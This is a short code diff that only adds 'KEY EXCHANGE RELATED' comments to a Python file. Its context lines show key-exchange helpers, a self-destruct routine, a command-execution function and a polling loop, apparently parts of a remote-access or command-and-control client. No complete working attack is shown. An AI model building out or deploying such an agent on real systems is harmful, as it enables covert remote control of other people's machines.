@@ -121,6 +121,7 @@ class SNIAdapter(HTTPAdapter):
         pool_kwargs['server_hostname'] = self.server_hostname
         self.poolmanager = PoolManager(num_pools=connections, maxsize=maxsize, block=block, **pool_kwargs)
 
+### KEY EXCHANGE RELATED
 def generate_params(response):
     parameters = serialization.load_pem_parameters(
         response.content,
@@ -178,7 +179,7 @@ def key_xchg(client_public_bytes):
         print("Error exchanging keys:", e)
         return False
 
-
+#### KEY EXCHANGE RELATED ABOVE
 
 def self_destruct():
     print("Initiating self-destruct sequence...")
@@ -286,6 +287,8 @@ def execute_command(cmd):
         return e.output.decode()
 
 def main():
+
+    ## KEY EXCHANGE RELATED
     params = get_params()
     public_key, private_key = generate_keys(params)
     client_public_bytes = public_key.public_bytes(
@@ -301,6 +304,8 @@ def main():
         salt=None,
         info=b'KEYAES',
     ).derive(shared_secret)
+
+    ## KEY EXCHANGE RELATED
 
     fail_count = 0
     while True:
